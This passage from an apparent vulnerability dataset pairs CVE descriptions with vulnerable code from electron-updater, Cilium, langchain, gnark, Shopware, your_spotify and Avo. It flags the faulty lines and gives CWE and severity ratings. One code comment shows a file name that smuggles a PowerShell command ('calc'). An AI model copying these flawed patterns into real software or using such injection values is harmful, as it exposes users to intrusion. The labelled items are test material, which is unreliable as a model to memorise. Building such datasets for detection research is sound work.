    "description": "electron-updater allows for automatic updates for Electron apps. The file `packages/electron-updater/src/windowsExecutableCodeSignatureVerifier.ts` implements the signature validation routine for Electron applications on Windows. Because of the surrounding shell, a first pass by `cmd.exe` expands any environment variable found in command-line above. This creates a situation where `verifySignature()` can be tricked into validating the certificate of a different file than the one that was just downloaded. If the step is successful, the malicious update will be executed even if its signature is invalid. This attack assumes a compromised update manifest (server compromise, Man-in-the-Middle attack if fetched over HTTP, Cross-Site Scripting to point the application to a malicious updater server, etc.). The patch is available starting from 6.3.0-alpha.6.",
    "vulnerability": {
      "file_level": [
        {
          "name": "packages/electron-updater/src/windowsExecutableCodeSignatureVerifier.ts",
          "content": "import { parseDn } from \"builder-util-runtime\"\nimport { execFile, execFileSync } from \"child_process\"\nimport * as os from \"os\"\nimport { Logger } from \"./main\"\n\n// $certificateInfo = (Get-AuthenticodeSignature 'xxx\\yyy.exe'\n// | where {$_.Status.Equals([System.Management.Automation.SignatureStatus]::Valid) -and $_.SignerCertificate.Subject.Contains(\"CN=siemens.com\")})\n// | Out-String ; if ($certificateInfo) { exit 0 } else { exit 1 }\nexport function verifySignature(publisherNames: Array<string>, unescapedTempUpdateFile: string, logger: Logger): Promise<string | null> {\n  return new Promise<string | null>((resolve, reject) => {\n    // Escape quotes and backticks in filenames to prevent user from breaking the\n    // arguments and perform a remote command injection.\n    //\n    // Consider example powershell command:\n    // ```powershell\n    // Get-AuthenticodeSignature 'C:\\\\path\\\\my-bad-';calc;'filename.exe'\n    // ```\n    // The above would work expected and find the file name, however, it will also execute `;calc;`\n    // command and start the calculator app.\n    //\n    // From Powershell quoting rules:\n    // https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_quoting_rules?view=powershell-7\n    // * Double quotes `\"` are treated literally within single-quoted strings;\n    // * Single quotes can be escaped by doubling them: 'don''t' -> don't;\n    //\n    // Also note that at this point the file has already been written to the disk, thus we are\n    // guaranteed that the path will not contain any illegal characters like <>:\"/\\|?*\n    // https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file\n    const tempUpdateFile = unescapedTempUpdateFile.replace(/'/g, \"''\")\n    logger.info(`Verifying signature ${tempUpdateFile}`)\n\n    // https://github.com/electron-userland/electron-builder/issues/2421\n    // https://github.com/electron-userland/electron-builder/issues/2535\n    // Resetting PSModulePath is necessary https://github.com/electron-userland/electron-builder/issues/7127\n    execFile(\n      `set \"PSModulePath=\"; chcp 65001 >NUL & powershell.exe`,\n      [\"-NoProfile\", \"-NonInteractive\", \"-InputFormat\", \"None\", \"-Command\", `\"Get-AuthenticodeSignature -LiteralPath '${tempUpdateFile}' | ConvertTo-Json -Compress\"`],\n      {\n        shell: true,\n        timeout: 20 * 1000,\n      },\n      (error, stdout, stderr) => {\n        try {\n          if (error != null || stderr) {\n            handleError(logger, error, stderr, reject)\n            resolve(null)\n            return\n          }\n          const data = parseOut(stdout)\n          if (data.Status === 0) {\n            const subject = parseDn(data.SignerCertificate.Subject)\n            let match = false\n            for (const name of publisherNames) {\n              const dn = parseDn(name)\n              if (dn.size) {\n                // if we have a full DN, compare all values\n                const allKeys = Array.from(dn.keys())\n                match = allKeys.every(key => {\n                  return dn.get(key) === subject.get(key)\n                })\n              } else if (name === subject.get(\"CN\")!) {\n                logger.warn(`Signature validated using only CN ${name}. Please add your full Distinguished Name (DN) to publisherNames configuration`)\n                match = true\n              }\n              if (match) {\n                resolve(null)\n                return\n              }\n            }\n          }\n\n          const result = `publisherNames: ${publisherNames.join(\" | \")}, raw info: ` + JSON.stringify(data, (name, value) => (name === \"RawData\" ? undefined : value), 2)\n          logger.warn(`Sign verification failed, installer signed with incorrect certificate: ${result}`)\n          resolve(result)\n        } catch (e: any) {\n          handleError(logger, e, null, reject)\n          resolve(null)\n          return\n        }\n      }\n    )\n  })\n}\n\nfunction parseOut(out: string): any {\n  const data = JSON.parse(out)\n  delete data.PrivateKey\n  delete data.IsOSBinary\n  delete data.SignatureType\n  const signerCertificate = data.SignerCertificate\n  if (signerCertificate != null) {\n    delete signerCertificate.Archived\n    delete signerCertificate.Extensions\n    delete signerCertificate.Handle\n    delete signerCertificate.HasPrivateKey\n    // duplicates data.SignerCertificate (contains RawData)\n    delete signerCertificate.SubjectName\n  }\n  delete data.Path\n  return data\n}\n\nfunction handleError(logger: Logger, error: Error | null, stderr: string | null, reject: (reason: any) => void): void {\n  if (isOldWin6()) {\n    logger.warn(\n      `Cannot execute Get-AuthenticodeSignature: ${error || stderr}. Ignoring signature validation due to unsupported powershell version. Please upgrade to powershell 3 or higher.`\n    )\n    return\n  }\n\n  try {\n    execFileSync(\"powershell.exe\", [\"-NoProfile\", \"-NonInteractive\", \"-Command\", \"ConvertTo-Json test\"], { timeout: 10 * 1000 } as any)\n  } catch (testError: any) {\n    logger.warn(\n      `Cannot execute ConvertTo-Json: ${testError.message}. Ignoring signature validation due to unsupported powershell version. Please upgrade to powershell 3 or higher.`\n    )\n    return\n  }\n\n  if (error != null) {\n    reject(error)\n  }\n\n  if (stderr) {\n    reject(new Error(`Cannot execute Get-AuthenticodeSignature, stderr: ${stderr}. Failing signature validation due to unknown stderr.`))\n  }\n}\n\nfunction isOldWin6(): boolean {\n  const winVersion = os.release()\n  return winVersion.startsWith(\"6.\") && !winVersion.startsWith(\"6.3\")\n}\n"
        }
      ],
      "method_level": [
        "parseOut"
      ],
      "hunk_level": [
        {
          "line_no": 99,
          "content": "  delete data.Path"
        }
      ]
    },
    "cwe": [
      "CWE-154",
      "CWE-295"
    ],
    "severity": "HIGH",
    "cvss_score": 7.5,
    "cvss_version": 3.1
  },
  {
    "id": 1090,
    "cve": "CVE-2024-42488",
    "description": "Cilium is a networking, observability, and security solution with an eBPF-based dataplane. Prior to versions 1.14.14 and 1.15.8, a race condition in the Cilium agent can cause the agent to ignore labels that should be applied to a node. This could in turn cause CiliumClusterwideNetworkPolicies intended for nodes with the ignored label to not apply, leading to policy bypass. This issue has been patched in Cilium v1.14.14 and v1.15.8 As the underlying issue depends on a race condition, users unable to upgrade can restart the Cilium agent on affected nodes until the affected policies are confirmed to be working as expected.",
    "vulnerability": {
      "file_level": [
        {
          "name": "pkg/endpointmanager/host.go",
          "content": "// SPDX-License-Identifier: Apache-2.0\n// Copyright Authors of Cilium\n\npackage endpointmanager\n\nimport (\n\t\"context\"\n\t\"maps\"\n\n\t\"github.com/cilium/cilium/pkg/endpoint\"\n\t\"github.com/cilium/cilium/pkg/labels\"\n\t\"github.com/cilium/cilium/pkg/node\"\n)\n\n// GetHostEndpoint returns the host endpoint.\nfunc (mgr *endpointManager) GetHostEndpoint() *endpoint.Endpoint {\n\tmgr.mutex.RLock()\n\tdefer mgr.mutex.RUnlock()\n\tfor _, ep := range mgr.endpoints {\n\t\tif ep.IsHost() {\n\t\t\treturn ep\n\t\t}\n\t}\n\treturn nil\n}\n\n// HostEndpointExists returns true if the host endpoint exists.\nfunc (mgr *endpointManager) HostEndpointExists() bool {\n\treturn mgr.GetHostEndpoint() != nil\n}\n\nfunc (mgr *endpointManager) startNodeLabelsObserver(old map[string]string) {\n\tmgr.localNodeStore.Observe(context.Background(), func(ln node.LocalNode) {\n\t\tif maps.Equal(old, ln.Labels) {\n\t\t\treturn\n\t\t}\n\n\t\tmgr.updateHostEndpointLabels(old, ln.Labels)\n\t\told = ln.Labels\n\t}, func(error) { /* Executed only when we are shutting down */ })\n}\n\nfunc (mgr *endpointManager) updateHostEndpointLabels(oldNodeLabels, newNodeLabels map[string]string) {\n\tnodeEP := mgr.GetHostEndpoint()\n\tif nodeEP == nil {\n\t\tlog.Error(\"Host endpoint not found\")\n\t\treturn\n\t}\n\n\terr := nodeEP.UpdateLabelsFrom(oldNodeLabels, newNodeLabels, labels.LabelSourceK8s)\n\tif err != nil {\n\t\t// An error can only occur if either the endpoint is terminating, or the\n\t\t// old labels are not found. Both are impossible, hence there's no point\n\t\t// in retrying.\n\t\tlog.WithError(err).Error(\"Unable to update host endpoint labels\")\n\t\treturn\n\t}\n}\n"
        }
      ],
      "method_level": [
        "func (mgr *endpointManager) startNodeLabelsObserver(old map[string]string) {\n\tmgr.localNodeStore.Observe(context.Background(), func(ln node.LocalNode) {\n\t\tif maps.Equal(old, ln.Labels) {\n\t\t\treturn\n\t\t}\n\n\t\tmgr.updateHostEndpointLabels(old, ln.Labels)\n\t\told = ln.Labels\n\t}, func(error) { /* Executed only when we are shutting down */ })\n}",
        "func (mgr *endpointManager) updateHostEndpointLabels(oldNodeLabels, newNodeLabels map[string]string) {\n\tnodeEP := mgr.GetHostEndpoint()\n\tif nodeEP == nil {\n\t\tlog.Error(\"Host endpoint not found\")\n\t\treturn\n\t}\n\n\terr := nodeEP.UpdateLabelsFrom(oldNodeLabels, newNodeLabels, labels.LabelSourceK8s)\n\tif err != nil {\n\t\t// An error can only occur if either the endpoint is terminating, or the\n\t\t// old labels are not found. Both are impossible, hence there's no point\n\t\t// in retrying.\n\t\tlog.WithError(err).Error(\"Unable to update host endpoint labels\")\n\t\treturn\n\t}\n}"
      ],
      "hunk_level": [
        {
          "line_no": 38,
          "content": "\t\tmgr.updateHostEndpointLabels(old, ln.Labels)"
        },
        {
          "line_no": 39,
          "content": "\t\told = ln.Labels"
        },
        {
          "line_no": 43,
          "content": "func (mgr *endpointManager) updateHostEndpointLabels(oldNodeLabels, newNodeLabels map[string]string) {"
        },
        {
          "line_no": 47,
          "content": "\t\treturn"
        },
        {
          "line_no": 50,
          "content": "\terr := nodeEP.UpdateLabelsFrom(oldNodeLabels, newNodeLabels, labels.LabelSourceK8s)"
        },
        {
          "line_no": 51,
          "content": "\tif err != nil {"
        },
        {
          "line_no": 56,
          "content": "\t\treturn"
        }
      ]
    },
    "cwe": [
      "CWE-362"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.8,
    "cvss_version": 3.1
  },
  {
    "id": 665,
    "cve": "CVE-2024-3571",
    "description": "langchain-ai/langchain is vulnerable to path traversal due to improper limitation of a pathname to a restricted directory ('Path Traversal') in its LocalFileStore functionality. An attacker can leverage this vulnerability to read or write files anywhere on the filesystem, potentially leading to information disclosure or remote code execution. The issue lies in the handling of file paths in the mset and mget methods, where user-supplied input is not adequately sanitized, allowing directory traversal sequences to reach unintended directories.",
    "vulnerability": {
      "file_level": [
        {
          "name": "libs/langchain/langchain/storage/file_system.py",
          "content": "import re\nfrom pathlib import Path\nfrom typing import Iterator, List, Optional, Sequence, Tuple, Union\n\nfrom langchain_core.stores import ByteStore\n\nfrom langchain.storage.exceptions import InvalidKeyException\n\n\nclass LocalFileStore(ByteStore):\n    \"\"\"BaseStore interface that works on the local file system.\n\n    Examples:\n        Create a LocalFileStore instance and perform operations on it:\n\n        .. code-block:: python\n\n            from langchain.storage import LocalFileStore\n\n            # Instantiate the LocalFileStore with the root path\n            file_store = LocalFileStore(\"/path/to/root\")\n\n            # Set values for keys\n            file_store.mset([(\"key1\", b\"value1\"), (\"key2\", b\"value2\")])\n\n            # Get values for keys\n            values = file_store.mget([\"key1\", \"key2\"])  # Returns [b\"value1\", b\"value2\"]\n\n            # Delete keys\n            file_store.mdelete([\"key1\"])\n\n            # Iterate over keys\n            for key in file_store.yield_keys():\n                print(key)\n\n    \"\"\"\n\n    def __init__(self, root_path: Union[str, Path]) -> None:\n        \"\"\"Implement the BaseStore interface for the local file system.\n\n        Args:\n            root_path (Union[str, Path]): The root path of the file store. All keys are\n                interpreted as paths relative to this root.\n        \"\"\"\n        self.root_path = Path(root_path)\n\n    def _get_full_path(self, key: str) -> Path:\n        \"\"\"Get the full path for a given key relative to the root path.\n\n        Args:\n            key (str): The key relative to the root path.\n\n        Returns:\n            Path: The full path for the given key.\n        \"\"\"\n        if not re.match(r\"^[a-zA-Z0-9_.\\-/]+$\", key):\n            raise InvalidKeyException(f\"Invalid characters in key: {key}\")\n        return self.root_path / key\n\n    def mget(self, keys: Sequence[str]) -> List[Optional[bytes]]:\n        \"\"\"Get the values associated with the given keys.\n\n        Args:\n            keys: A sequence of keys.\n\n        Returns:\n            A sequence of optional values associated with the keys.\n            If a key is not found, the corresponding value will be None.\n        \"\"\"\n        values: List[Optional[bytes]] = []\n        for key in keys:\n            full_path = self._get_full_path(key)\n            if full_path.exists():\n                value = full_path.read_bytes()\n                values.append(value)\n            else:\n                values.append(None)\n        return values\n\n    def mset(self, key_value_pairs: Sequence[Tuple[str, bytes]]) -> None:\n        \"\"\"Set the values for the given keys.\n\n        Args:\n            key_value_pairs: A sequence of key-value pairs.\n\n        Returns:\n            None\n        \"\"\"\n        for key, value in key_value_pairs:\n            full_path = self._get_full_path(key)\n            full_path.parent.mkdir(parents=True, exist_ok=True)\n            full_path.write_bytes(value)\n\n    def mdelete(self, keys: Sequence[str]) -> None:\n        \"\"\"Delete the given keys and their associated values.\n\n        Args:\n            keys (Sequence[str]): A sequence of keys to delete.\n\n        Returns:\n            None\n        \"\"\"\n        for key in keys:\n            full_path = self._get_full_path(key)\n            if full_path.exists():\n                full_path.unlink()\n\n    def yield_keys(self, prefix: Optional[str] = None) -> Iterator[str]:\n        \"\"\"Get an iterator over keys that match the given prefix.\n\n        Args:\n            prefix (Optional[str]): The prefix to match.\n\n        Returns:\n            Iterator[str]: An iterator over keys that match the given prefix.\n        \"\"\"\n        prefix_path = self._get_full_path(prefix) if prefix else self.root_path\n        for file in prefix_path.rglob(\"*\"):\n            if file.is_file():\n                relative_path = file.relative_to(self.root_path)\n                yield str(relative_path)\n"
        }
      ],
      "method_level": [
        "def __init__(self, root_path: Union[str, Path]) -> None:\n        \"\"\"Implement the BaseStore interface for the local file system.\n\n        Args:\n            root_path (Union[str, Path]): The root path of the file store. All keys are\n                interpreted as paths relative to this root.\n        \"\"\"\n        self.root_path = Path(root_path)",
        "def _get_full_path(self, key: str) -> Path:\n        \"\"\"Get the full path for a given key relative to the root path.\n\n        Args:\n            key (str): The key relative to the root path.\n\n        Returns:\n            Path: The full path for the given key.\n        \"\"\"\n        if not re.match(r\"^[a-zA-Z0-9_.\\-/]+$\", key):\n            raise InvalidKeyException(f\"Invalid characters in key: {key}\")\n        return self.root_path / key"
      ],
      "hunk_level": [
        {
          "line_no": 45,
          "content": "        self.root_path = Path(root_path)"
        },
        {
          "line_no": 58,
          "content": "        return self.root_path / key"
        }
      ]
    },
    "cwe": [
      "CWE-22"
    ],
    "severity": "HIGH",
    "cvss_score": 8.8,
    "cvss_version": 3.1
  },
  {
    "id": 1155,
    "cve": "CVE-2024-45040",
    "description": "gnark is a fast zk-SNARK library that offers a high-level API to design circuits. Prior to version 0.11.0, commitments to private witnesses in Groth16 as implemented break the zero-knowledge property. The vulnerability affects only Groth16 proofs with commitments. Notably, PLONK proofs are not affected. The vulnerability affects the zero-knowledge property of the proofs - in case the witness (secret or internal) values are small, then the attacker may be able to enumerate all possible choices to deduce the actual value. If the possible choices for the variables to be committed is large or there are many values committed, then it would be computationally infeasible to enumerate all valid choices. It doesn't affect the completeness/soundness of the proofs. The vulnerability has been fixed in version 0.11.0. The patch to fix the issue is to add additional randomized value to the list of committed value at proving time to mask the rest of the values which were committed. As a workaround, the user can manually commit to a randomized value.",
    "vulnerability": {
      "file_level": [
        {
          "name": "constraint/solver/hint_registry.go",
          "content": "package solver\n\nimport (\n\t\"fmt\"\n\t\"math/big\"\n\t\"sync\"\n\n\t\"github.com/consensys/gnark/logger\"\n)\n\nfunc init() {\n\tRegisterHint(InvZeroHint)\n}\n\nvar (\n\tregistry  = make(map[HintID]Hint)\n\tregistryM sync.RWMutex\n)\n\n// RegisterHint registers a hint function in the global registry.\nfunc RegisterHint(hintFns ...Hint) {\n\tregistryM.Lock()\n\tdefer registryM.Unlock()\n\tfor _, hintFn := range hintFns {\n\t\tkey := GetHintID(hintFn)\n\t\tname := GetHintName(hintFn)\n\t\tif _, ok := registry[key]; ok {\n\t\t\tlog := logger.Logger()\n\t\t\tlog.Debug().Str(\"name\", name).Msg(\"function registered multiple times\")\n\t\t\treturn\n\t\t}\n\t\tregistry[key] = hintFn\n\t}\n}\n\nfunc GetRegisteredHint(key HintID) Hint {\n\tregistryM.Lock()\n\tdefer registryM.Unlock()\n\treturn registry[key]\n}\n\nfunc RegisterNamedHint(hintFn Hint, key HintID) {\n\tregistryM.Lock()\n\tdefer registryM.Unlock()\n\tif _, ok := registry[key]; ok {\n\t\tpanic(fmt.Errorf(\"hint id %d already taken\", key))\n\t}\n\tregistry[key] = hintFn\n}\n\n// GetRegisteredHints returns all registered hint functions.\nfunc GetRegisteredHints() []Hint {\n\tregistryM.RLock()\n\tdefer registryM.RUnlock()\n\tret := make([]Hint, 0, len(registry))\n\tfor _, v := range registry {\n\t\tret = append(ret, v)\n\t}\n\treturn ret\n}\n\nfunc cloneMap[K comparable, V any](src map[K]V) map[K]V {\n\tres := make(map[K]V, len(registry))\n\tfor k, v := range src {\n\t\tres[k] = v\n\t}\n\treturn res\n}\n\nfunc cloneHintRegistry() map[HintID]Hint {\n\tregistryM.Lock()\n\tdefer registryM.Unlock()\n\treturn cloneMap(registry)\n}\n\n// InvZeroHint computes the value 1/a for the single input a. If a == 0, returns 0.\nfunc InvZeroHint(q *big.Int, inputs []*big.Int, results []*big.Int) error {\n\tresult := results[0]\n\n\t// save input\n\tresult.Set(inputs[0])\n\n\t// a == 0, return\n\tif result.IsUint64() && result.Uint64() == 0 {\n\t\treturn nil\n\t}\n\n\tresult.ModInverse(result, q)\n\treturn nil\n}\n"
        },
        {
          "name": "std/multicommit/nativecommit_test.go",
          "content": "package multicommit\n\nimport (\n\t\"testing\"\n\n\t\"github.com/consensys/gnark-crypto/ecc\"\n\t\"github.com/consensys/gnark/backend\"\n\t\"github.com/consensys/gnark/frontend\"\n\t\"github.com/consensys/gnark/frontend/cs/r1cs\"\n\t\"github.com/consensys/gnark/test\"\n)\n\ntype noRecursionCircuit struct {\n\tX frontend.Variable\n}\n\nfunc (c *noRecursionCircuit) Define(api frontend.API) error {\n\tWithCommitment(api, func(api frontend.API, commitment frontend.Variable) error {\n\t\tWithCommitment(api, func(api frontend.API, commitment frontend.Variable) error { return nil }, commitment)\n\t\treturn nil\n\t}, c.X)\n\treturn nil\n}\n\nfunc TestNoRecursion(t *testing.T) {\n\tcircuit := noRecursionCircuit{}\n\tassert := test.NewAssert(t)\n\t_, err := frontend.Compile(ecc.BN254.ScalarField(), r1cs.NewBuilder, &circuit)\n\tassert.Error(err)\n}\n\ntype multipleCommitmentCircuit struct {\n\tX frontend.Variable\n}\n\nfunc (c *multipleCommitmentCircuit) Define(api frontend.API) error {\n\tvar stored frontend.Variable\n\t// first callback receives first unique commitment derived from the root commitment\n\tWithCommitment(api, func(api frontend.API, commitment frontend.Variable) error {\n\t\tapi.AssertIsDifferent(c.X, commitment)\n\t\tstored = commitment\n\t\treturn nil\n\t}, c.X)\n\tWithCommitment(api, func(api frontend.API, commitment frontend.Variable) error {\n\t\tapi.AssertIsDifferent(stored, commitment)\n\t\treturn nil\n\t}, c.X)\n\treturn nil\n}\n\nfunc TestMultipleCommitments(t *testing.T) {\n\tcircuit := multipleCommitmentCircuit{}\n\tassignment := multipleCommitmentCircuit{X: 10}\n\tassert := test.NewAssert(t)\n\tassert.ProverSucceeded(&circuit, &assignment, test.WithCurves(ecc.BN254), test.WithBackends(backend.GROTH16)) // right now PLONK doesn't implement commitment\n}\n\ntype noCommitVariable struct {\n\tX frontend.Variable\n}\n\nfunc (c *noCommitVariable) Define(api frontend.API) error {\n\tWithCommitment(api, func(api frontend.API, commitment frontend.Variable) error { return nil })\n\treturn nil\n}\n\nfunc TestNoCommitVariable(t *testing.T) {\n\tcircuit := noCommitVariable{}\n\tassert := test.NewAssert(t)\n\t_, err := frontend.Compile(ecc.BN254.ScalarField(), r1cs.NewBuilder, &circuit)\n\tassert.Error(err)\n}\n"
        }
      ],
      "method_level": [
        "func init() {\n\tRegisterHint(InvZeroHint)\n}",
        "func TestMultipleCommitments(t *testing.T) {\n\tcircuit := multipleCommitmentCircuit{}\n\tassignment := multipleCommitmentCircuit{X: 10}\n\tassert := test.NewAssert(t)\n\tassert.ProverSucceeded(&circuit, &assignment, test.WithCurves(ecc.BN254), test.WithBackends(backend.GROTH16)) // right now PLONK doesn't implement commitment\n}",
        "func TestNoCommitVariable(t *testing.T) {\n\tcircuit := noCommitVariable{}\n\tassert := test.NewAssert(t)\n\t_, err := frontend.Compile(ecc.BN254.ScalarField(), r1cs.NewBuilder, &circuit)\n\tassert.Error(err)\n}"
      ],
      "hunk_level": [
        {
          "line_no": 12,
          "content": "\tRegisterHint(InvZeroHint)"
        },
        {
          "line_no": 55,
          "content": "\tassert.ProverSucceeded(&circuit, &assignment, test.WithCurves(ecc.BN254), test.WithBackends(backend.GROTH16)) // right now PLONK doesn't implement commitment"
        },
        {
          "line_no": 70,
          "content": "\t_, err := frontend.Compile(ecc.BN254.ScalarField(), r1cs.NewBuilder, &circuit)"
        },
        {
          "line_no": 71,
          "content": "\tassert.Error(err)"
        }
      ]
    },
    "cwe": [
      "CWE-200"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.9,
    "cvss_version": 3.1
  },
  {
    "id": 1061,
    "cve": "CVE-2024-42355",
    "description": "Shopware, an open ecommerce platform, has a new Twig Tag `sw_silent_feature_call` which silences deprecation messages while triggered in this tag. Prior to versions 6.6.5.1 and 6.5.8.13, it accepts as parameter a string the feature flag name to silence, but this parameter is not escaped properly and allows execution of code. Update to Shopware 6.6.5.1 or 6.5.8.13 to receive a patch. For older versions of 6.2, 6.3,  and 6.4, corresponding security measures are also available via a plugin.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/Core/Framework/Adapter/Twig/Node/FeatureCallSilentToken.php",
          "content": "<?php declare(strict_types=1);\n\nnamespace Shopware\\Core\\Framework\\Adapter\\Twig\\Node;\n\nuse Shopware\\Core\\Framework\\Log\\Package;\nuse Twig\\Compiler;\nuse Twig\\Node\\Node;\n\n#[Package('core')]\nclass FeatureCallSilentToken extends Node\n{\n    public function __construct(\n        private readonly string $flag,\n        Node $body,\n        int $line,\n        string $tag\n    ) {\n        parent::__construct(['body' => $body], [], $line, $tag);\n    }\n\n    public function compile(Compiler $compiler): void\n    {\n        $compiler\n            ->addDebugInfo($this)\n            ->raw('\\Shopware\\Core\\Framework\\Feature::callSilentIfInactive(\\'' . $this->flag . '\\', function () use(&$context) { ')\n            ->subcompile($this->getNode('body'))\n            ->raw('});');\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function compile(Compiler $compiler): void\n    {\n        $compiler\n            ->addDebugInfo($this)\n            ->raw('\\Shopware\\Core\\Framework\\Feature::callSilentIfInactive(\\'' . $this->flag . '\\', function () use(&$context) { ')\n            ->subcompile($this->getNode('body'))\n            ->raw('});');\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 25,
          "content": "            ->raw('\\Shopware\\Core\\Framework\\Feature::callSilentIfInactive(\\'' . $this->flag . '\\', function () use(&$context) { ')"
        }
      ]
    },
    "cwe": [
      "CWE-94",
      "CWE-1336"
    ],
    "severity": "HIGH",
    "cvss_score": 8.3,
    "cvss_version": 3.1
  },
  {
    "id": 431,
    "cve": "CVE-2024-28195",
    "description": "your_spotify is an open source, self hosted Spotify tracking dashboard. YourSpotify versions < 1.9.0 do not protect the API and login flow against Cross-Site Request Forgery (CSRF). Attackers can use this to execute CSRF attacks on victims, allowing them to retrieve, modify or delete data on the affected YourSpotify instance. Using repeated CSRF attacks, it is also possible to create a new user on the victim instance and promote the new user to instance administrator if a legitimate administrator visits a website prepared by an attacker. Note: Real-world exploitability of this vulnerability depends on the browser version and browser settings in use by the victim. This issue has been addressed in version 1.9.0. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "vulnerability": {
      "file_level": [
        {
          "name": "apps/server/src/database/queries/privateData.ts",
          "content": "import { randomUUID } from \"crypto\";\nimport { PrivateDataModel } from \"../Models\";\n\nexport async function createPrivateData() {\n  await PrivateDataModel.create({ jwtPrivateKey: randomUUID() });\n}\n\nexport async function getPrivateData() {\n  return PrivateDataModel.findOne({});\n}\n"
        }
      ],
      "method_level": [
        "createPrivateData"
      ],
      "hunk_level": [
        {
          "line_no": 5,
          "content": "  await PrivateDataModel.create({ jwtPrivateKey: randomUUID() });"
        }
      ]
    },
    "cwe": [
      "CWE-352"
    ],
    "severity": "HIGH",
    "cvss_score": 8.1,
    "cvss_version": 3.1
  },
  {
    "id": 91,
    "cve": "CVE-2024-22411",
    "description": "Avo is a framework to create admin panels for Ruby on Rails apps. In Avo 3 pre12, any HTML inside text that is passed to `error` or `succeed` in an `Avo::BaseAction` subclass will be rendered directly without sanitization in the toast/notification that appears in the UI on Action completion. A malicious user could exploit this vulnerability to trigger a cross site scripting attack on an unsuspecting user. This issue has been addressed in the 3.3.0 and 2.47.0 releases of Avo. Users are advised to upgrade.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/javascript/js/controllers/fields/key_value_controller.js",
          "content": "/* eslint-disable max-len */\nimport { Controller } from '@hotwired/stimulus'\nimport { castBoolean } from '../../helpers/cast_boolean'\n\nexport default class extends Controller {\n  static targets = ['input', 'controller', 'rows']\n\n  fieldValue = []\n\n  options = {}\n\n  get keyInputDisabled() {\n    return !this.options.editable || this.options.disable_editing_keys\n  }\n\n  get valueInputDisabled() {\n    return !this.options.editable\n  }\n\n  connect() {\n    this.setOptions()\n\n    try {\n      const objectValue = JSON.parse(this.inputTarget.value)\n      Object.keys(objectValue).forEach((key) => this.fieldValue.push([key, objectValue[key]]))\n    } catch (error) {\n      this.fieldValue = []\n    }\n\n    this.updateKeyValueComponent()\n  }\n\n  addRow() {\n    if (this.options.disable_adding_rows || !this.options.editable) return\n    this.fieldValue.push(['', ''])\n    this.updateKeyValueComponent()\n    this.focusLastRow()\n  }\n\n  deleteRow(event) {\n    if (this.options.disable_deleting_rows || !this.options.editable) return\n    const { index } = event.params\n    this.fieldValue.splice(index, 1)\n    this.updateTextareaInput()\n    this.updateKeyValueComponent()\n  }\n\n  focusLastRow() {\n    return this.rowsTarget.querySelector('.flex.key-value-row:last-child .key-value-input-key').focus()\n  }\n\n  valueFieldUpdated(event) {\n    const { value } = event.target\n    const { index } = event.target.dataset\n    this.fieldValue[index][1] = value\n\n    this.updateTextareaInput()\n  }\n\n  keyFieldUpdated(event) {\n    const { value } = event.target\n    const { index } = event.target.dataset\n    this.fieldValue[index][0] = value\n\n    this.updateTextareaInput()\n  }\n\n  updateTextareaInput() {\n    if (!this.hasInputTarget) return\n    let result = {}\n    if (this.fieldValue && this.fieldValue.length > 0) {\n      result = Object.assign(...this.fieldValue.map(([key, val]) => ({ [key]: val })))\n    }\n    this.inputTarget.innerText = JSON.stringify(result)\n    this.inputTarget.dispatchEvent(new Event('input'))\n  }\n\n  updateKeyValueComponent() {\n    let result = ''\n    let index = 0\n    this.fieldValue.forEach((row) => {\n      const [key, value] = row\n      result += this.interpolatedRow(key, value, index)\n      index++\n    })\n    this.rowsTarget.innerHTML = result\n    window.initTippy()\n  }\n\n  interpolatedRow(key, value, index) {\n    let result = `<div class=\"flex key-value-row\">\n      ${this.inputField('key', index, key, value)}\n      ${this.inputField('value', index, key, value)}`\n    if (this.options.editable) {\n      result += `<a\n  href=\"javascript:void(0);\"\n  data-key-value-index-param=\"${index}\"\n  data-action=\"click->key-value#deleteRow\"\n  title=\"${this.options.delete_text}\"\n  data-tippy=\"tooltip\"\n  data-button=\"delete-row\"\n  tabindex=\"-1\"\n  ${this.options.disable_deleting_rows ? \"disabled='disabled'\" : ''}\n  class=\"flex items-center justify-center p-2 px-3 border-none ${this.options.disable_deleting_rows ? 'cursor-not-allowed' : ''}\"\n><svg class=\"pointer-events-none text-gray-500 h-5 hover:text-gray-500\" fill=\"none\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"2\" viewBox=\"0 0 24 24\" stroke=\"currentColor\"><path d=\"M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16\"></path></svg></a>`\n    }\n    result += '</div>'\n\n    return result\n  }\n\n  inputField(id = 'key', index, key, value) {\n    const inputValue = id === 'key' ? key : value\n\n    return `<input\n  class=\"${this.options.inputClasses} focus:bg-gray-100 !rounded-none border-gray-600 border-r border-l-0 border-b-0 border-t-0 focus:border-gray-300 w-1/2 focus:outline-none outline-none key-value-input-${id}\"\n  data-action=\"input->key-value#${id}FieldUpdated\"\n  placeholder=\"${this.options[`${id}_label`]}\"\n  data-index=\"${index}\"\n  ${this[`${id}InputDisabled`] ? \"disabled='disabled'\" : ''}\n  value=\"${typeof inputValue === 'undefined' || inputValue === null ? '' : inputValue}\"\n/>`\n  }\n\n  setOptions() {\n    let fieldOptions\n\n    try {\n      fieldOptions = JSON.parse(this.controllerTarget.dataset.options)\n    } catch (error) {\n      fieldOptions = {}\n    }\n    this.options = {\n      ...fieldOptions,\n      inputClasses: this.controllerTarget.dataset.inputClasses,\n      editable: castBoolean(this.controllerTarget.dataset.editable),\n    }\n  }\n}\n"
        }
      ],
      "method_level": [
        "updateKeyValueComponent() {\n    let result = ''\n    let index = 0\n    this.fieldValue.forEach((row) => {\n      const [key, value] = row\n      result += this.interpolatedRow(key, value, index)\n      index++\n    })\n    this.rowsTarget.innerHTML = result\n    window.initTippy()\n  }"
      ],
      "hunk_level": [
        {
          "line_no": 83,
          "content": "      result += this.interpolatedRow(key, value, index)"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 123,
    "cve": "CVE-2024-23679",
